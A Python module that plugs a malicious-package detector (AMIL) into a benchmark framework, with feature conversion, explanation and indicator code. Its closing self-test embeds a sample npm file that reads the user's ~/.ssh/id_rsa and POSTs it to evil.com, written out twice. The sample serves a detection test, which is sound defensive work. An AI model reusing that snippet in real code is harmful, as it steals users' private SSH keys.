"""
Integration of AMIL with the ICN benchmark framework.
Adds AMILBenchmarkModel to enable comparison with ICN, LLMs, and other models.
"""

import time
import logging
from pathlib import Path
from typing import Dict, List, Optional, Any
import torch

# Import from ICN benchmark framework
from icn.evaluation.benchmark_framework import BaseModel, BenchmarkResult, BenchmarkSample

# Import AMIL components
from amil.model import AMILModel, create_amil_model
from amil.feature_extractor import AMILFeatureExtractor, UnitFeatures, extract_features_from_code
from amil.config import AMILConfig, EvaluationConfig, create_default_config
from amil.trainer import PackageSample

logger = logging.getLogger(__name__)


class AMILBenchmarkModel(BaseModel):
    """AMIL model wrapper for benchmark framework integration."""
    
    def __init__(self, model_path: Optional[str] = None, 
                 amil_config: Optional[AMILConfig] = None,
                 device: str = "auto"):
        super().__init__("AMIL")
        
        # Device selection
        if device == "auto":
            self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
        else:
            self.device = torch.device(device)
        
        # Configuration
        if amil_config is None:
            amil_config, _, _ = create_default_config()
        self.config = amil_config
        
        # Initialize components
        self.feature_extractor = AMILFeatureExtractor(amil_config)
        self.feature_extractor = self.feature_extractor.to(self.device)
        
        # Load or create model
        if model_path and Path(model_path).exists():
            self._load_trained_model(model_path)
            logger.info(f"Loaded trained AMIL model from {model_path}")
        else:
            # Create untrained model (for baseline comparison)
            self.model = create_amil_model(amil_config, self.device)
            logger.warning("Using untrained AMIL model - results will be random")
        
        logger.info(f"AMIL benchmark model initialized on {self.device}")
    
    def _load_trained_model(self, model_path: str):
        """Load trained AMIL model from checkpoint."""
        try:
            checkpoint = torch.load(model_path, map_location=self.device)
            
            # Load configurations if available
            if "amil_config" in checkpoint:
                self.config = checkpoint["amil_config"]
                # Reinitialize feature extractor with loaded config
                self.feature_extractor = AMILFeatureExtractor(self.config)
                self.feature_extractor = self.feature_extractor.to(self.device)
            
            # Create model and load weights
            self.model = create_amil_model(self.config, self.device)
            
            if "model_state_dict" in checkpoint:
                self.model.load_state_dict(checkpoint["model_state_dict"])
            
            if "feature_extractor_state_dict" in checkpoint:
                self.feature_extractor.load_state_dict(checkpoint["feature_extractor_state_dict"])
            
            # Set to evaluation mode
            self.model.eval()
            self.feature_extractor.eval()
            
        except Exception as e:
            logger.error(f"Failed to load AMIL model: {e}")
            # Fallback to untrained model
            self.model = create_amil_model(self.config, self.device)
    
    async def predict(self, sample: BenchmarkSample) -> BenchmarkResult:
        """Make prediction using AMIL model."""
        start_time = time.time()
        
        try:
            # Convert BenchmarkSample to AMIL format
            unit_features = self._convert_benchmark_sample_to_features(sample)
            
            if not unit_features:
                return self._create_error_result(sample, "No extractable features found")
            
            # Extract embeddings
            with torch.no_grad():
                unit_embeddings = self.feature_extractor.forward(unit_features)
            
            # Get prediction
            result = self.model.predict_package(
                unit_embeddings,
                unit_names=[f.unit_name for f in unit_features]
            )
            
            # Create explanation
            explanation = self._create_explanation(result, unit_features)
            
            return BenchmarkResult(
                model_name=self.model_name,
                sample_id=f"{sample.ecosystem}_{sample.package_name}",
                ground_truth=sample.ground_truth_label,
                prediction=1 if result["is_malicious"] else 0,
                confidence=result["confidence"],
                inference_time_seconds=time.time() - start_time,
                explanation=explanation,
                malicious_indicators=self._extract_malicious_indicators(result, unit_features),
                success=True,
                metadata={
                    "num_units_analyzed": result["num_units_analyzed"],
                    "malicious_probability": result["malicious_probability"],
                    "attention_entropy": result.get("attention_entropy", 0.0),
                    "top_suspicious_units": result.get("top_suspicious_units", [])
                }
            )
            
        except Exception as e:
            logger.error(f"AMIL prediction failed for {sample.package_name}: {e}")
            return self._create_error_result(sample, str(e), time.time() - start_time)
    
    def _convert_benchmark_sample_to_features(self, sample: BenchmarkSample) -> List[UnitFeatures]:
        """Convert BenchmarkSample to AMIL UnitFeatures format."""
        unit_features = []
        
        # Use individual files if available, otherwise fall back to combined content
        if sample.individual_files:
            for file_path, content in sample.individual_files.items():
                if content.strip():  # Skip empty files
                    features = extract_features_from_code(
                        raw_content=content,
                        file_path=file_path,
                        config=self.config,
                        extractor=self.feature_extractor
                    )
                    unit_features.append(features)
        else:
            # Parse combined content by file separators
            content_parts = sample.raw_content.split("=" * 50)  # File separator
            
            for i, part in enumerate(content_parts):
                if part.strip():
                    # Try to extract file path from content
                    lines = part.strip().split('\n')
                    file_path = f"file_{i}.unknown"
                    
                    # Look for file header
                    if lines and lines[0].startswith("# File:"):
                        try:
                            file_path = lines[0].split("# File:")[1].strip().split()[0]
                        except:
                            pass
                    
                    # Extract actual content (skip header)
                    content = '\n'.join(lines[1:] if lines[0].startswith("#") else lines)
                    
                    if content.strip():
                        features = extract_features_from_code(
                            raw_content=content,
                            file_path=file_path,
                            config=self.config,
                            extractor=self.feature_extractor
                        )
                        unit_features.append(features)
        
        return unit_features
    
    def _create_explanation(self, result: Dict[str, Any], unit_features: List[UnitFeatures]) -> str:
        """Create human-readable explanation."""
        explanation_parts = []
        
        # Main verdict
        verdict = "MALICIOUS" if result["is_malicious"] else "BENIGN"
        confidence = result["confidence"]
        explanation_parts.append(f"AMIL Verdict: {verdict} (confidence: {confidence:.3f})")
        
        # Unit analysis
        num_units = result["num_units_analyzed"]
        explanation_parts.append(f"Analyzed {num_units} code units")
        
        # Top suspicious units
        top_units = result.get("top_suspicious_units", [])
        if top_units:
            explanation_parts.append("Most suspicious units:")
            for unit in top_units[:3]:  # Top 3
                name = unit["unit_name"]
                weight = unit["attention_weight"]
                explanation_parts.append(f"  - {name} (attention: {weight:.3f})")
        
        # API analysis
        if result["is_malicious"] and unit_features:
            suspicious_apis = []
            for features in unit_features:
                for api, count in features.api_counts.items():
                    if count > 0 and any(sus in api for sus in ["subprocess", "eval", "obfuscation"]):
                        suspicious_apis.append(f"{api}({count})")
            
            if suspicious_apis:
                explanation_parts.append(f"Suspicious APIs: {', '.join(suspicious_apis[:5])}")
        
        return "; ".join(explanation_parts)
    
    def _extract_malicious_indicators(self, result: Dict[str, Any], 
                                    unit_features: List[UnitFeatures]) -> List[str]:
        """Extract malicious indicators for benchmark result."""
        indicators = []
        
        # From attention analysis
        top_units = result.get("top_suspicious_units", [])
        if top_units:
            indicators.extend([f"suspicious_unit:{unit['unit_name']}" for unit in top_units[:3]])
        
        # From API analysis
        for features in unit_features:
            for api, count in features.api_counts.items():
                if count > 0:
                    if "subprocess" in api:
                        indicators.append(f"subprocess_calls:{count}")
                    elif "eval" in api:
                        indicators.append(f"eval_calls:{count}")
                    elif "obfuscation" in api:
                        indicators.append(f"obfuscation:{count}")
                    elif "base64" in api:
                        indicators.append(f"base64_encoding:{count}")
        
        # From entropy analysis
        high_entropy_units = [f for f in unit_features if f.shannon_entropy > 6.0]
        if high_entropy_units:
            indicators.append(f"high_entropy_units:{len(high_entropy_units)}")
        
        return list(set(indicators))  # Remove duplicates
    
    def _create_error_result(self, sample: BenchmarkSample, error_msg: str, 
                           inference_time: float = 0.0) -> BenchmarkResult:
        """Create error result."""
        return BenchmarkResult(
            model_name=self.model_name,
            sample_id=f"{sample.ecosystem}_{sample.package_name}",
            ground_truth=sample.ground_truth_label,
            prediction=0,  # Conservative prediction
            confidence=0.5,  # Neutral confidence
            inference_time_seconds=inference_time,
            explanation=f"AMIL analysis failed: {error_msg}",
            success=False,
            error_message=error_msg
        )
    
    def get_model_info(self) -> Dict[str, Any]:
        """Get AMIL model information."""
        return {
            "model_type": "AMIL",
            "model_class": "Attention-MIL",
            "approach": "Multiple Instance Learning with Attention",
            "supports_explanations": True,
            "supports_unit_localization": True,
            "inference_method": "local",
            "device": str(self.device),
            
            # Configuration details
            "config": {
                "unit_embedding_dim": self.config.unit_embedding_dim,
                "attention_heads": self.config.attention_heads,
                "max_units_per_package": self.config.max_units_per_package,
                "api_categories": len(self.config.api_categories)
            }
        }
    
    def get_detailed_prediction(self, sample: BenchmarkSample) -> Dict[str, Any]:
        """Get detailed prediction with full attention analysis."""
        try:
            # Convert to AMIL format
            unit_features = self._convert_benchmark_sample_to_features(sample)
            
            if not unit_features:
                return {"error": "No extractable features"}
            
            # Get detailed explanation
            with torch.no_grad():
                unit_embeddings = self.feature_extractor.forward(unit_features)
                explanation = self.model.get_attention_explanation(
                    unit_embeddings,
                    [f.unit_name for f in unit_features],
                    unit_features
                )
            
            return explanation
            
        except Exception as e:
            logger.error(f"Detailed prediction failed: {e}")
            return {"error": str(e)}


def convert_benchmark_samples_to_amil(benchmark_samples: List[BenchmarkSample]) -> List[PackageSample]:
    """Convert benchmark samples to AMIL PackageSample format for training."""
    amil_samples = []
    
    for sample in benchmark_samples:
        # Create unit features
        unit_features = []
        
        if sample.individual_files:
            for file_path, content in sample.individual_files.items():
                if content.strip():
                    # Create basic UnitFeatures (without full feature extraction)
                    features = UnitFeatures(
                        unit_name=Path(file_path).name,
                        file_path=file_path,
                        unit_type="file",
                        ecosystem=sample.ecosystem,
                        raw_content=content
                    )
                    unit_features.append(features)
        
        if unit_features:
            amil_sample = PackageSample(
                package_name=sample.package_name,
                label=sample.ground_truth_label,
                unit_features=unit_features,
                ecosystem=sample.ecosystem,
                sample_type=sample.sample_type,
                metadata=sample.metadata.copy()
            )
            amil_samples.append(amil_sample)
    
    return amil_samples


def create_amil_benchmark_model(model_path: Optional[str] = None,
                              device: str = "auto") -> AMILBenchmarkModel:
    """Create AMIL benchmark model with default configuration."""
    return AMILBenchmarkModel(model_path=model_path, device=device)


# Integration function to add AMIL to existing benchmark suites
def add_amil_to_benchmark_suite(benchmark_suite, model_path: Optional[str] = None):
    """
    Add AMIL model to an existing benchmark suite.
    
    Args:
        benchmark_suite: Existing ICN benchmark suite
        model_path: Optional path to trained AMIL model
    """
    amil_model = create_amil_benchmark_model(model_path)
    
    # Add to benchmark suite (assuming it has a register_model method)
    if hasattr(benchmark_suite, 'register_model'):
        benchmark_suite.register_model(amil_model)
        logger.info("✅ AMIL model added to benchmark suite")
    else:
        logger.warning("⚠️  Benchmark suite doesn't support model registration")
    
    return amil_model


if __name__ == "__main__":
    # Test AMIL benchmark integration
    import asyncio
    
    async def test_amil_benchmark():
        """Test AMIL benchmark model."""
        
        # Create test sample
        test_sample = BenchmarkSample(
            package_name="test-malicious-package",
            ecosystem="npm", 
            sample_type="malicious_intent",
            ground_truth_label=1,
            raw_content="""
# File: package.json
{"name": "test", "version": "1.0.0"}
==================================================
# File: index.js
const fs = require('fs');
const os = require('os');

function stealData() {
    const homeDir = os.homedir();
    const data = fs.readFileSync(homeDir + '/.ssh/id_rsa');
    require('https').request('http://evil.com', {method: 'POST'}, (res) => {}).end(data);
}

stealData();
module.exports = {};
==================================================
            """.strip(),
            file_paths=["package.json", "index.js"],
            individual_files={
                "package.json": '{"name": "test", "version": "1.0.0"}',
                "index.js": """const fs = require('fs');
const os = require('os');

function stealData() {
    const homeDir = os.homedir();
    const data = fs.readFileSync(homeDir + '/.ssh/id_rsa');
    require('https').request('http://evil.com', {method: 'POST'}, (res) => {}).end(data);
}

stealData();
module.exports = {};"""
            },
            num_files=2
        )
        
        # Create AMIL model (untrained for testing)
        amil_model = create_amil_benchmark_model()
        
        # Test prediction
        result = await amil_model.predict(test_sample)
        
        print("🧪 AMIL Benchmark Test Results:")
        print(f"   Model: {result.model_name}")
        print(f"   Prediction: {'MALICIOUS' if result.prediction else 'BENIGN'}")
        print(f"   Confidence: {result.confidence:.3f}")
        print(f"   Inference time: {result.inference_time_seconds:.3f}s")
        print(f"   Success: {result.success}")
        print(f"   Explanation: {result.explanation}")
        print(f"   Indicators: {result.malicious_indicators}")
        
        # Test detailed prediction
        detailed = amil_model.get_detailed_prediction(test_sample)
        print(f"\n📊 Detailed Analysis:")
        if "error" not in detailed:
            print(f"   Verdict: {detailed.get('package_verdict', {})}")
            print(f"   Top units: {len(detailed.get('unit_rankings', []))}")
        else:
            print(f"   Error: {detailed['error']}")
        
        print("✅ AMIL benchmark integration test completed")
    
    # Run test
    asyncio.run(test_amil_benchmark())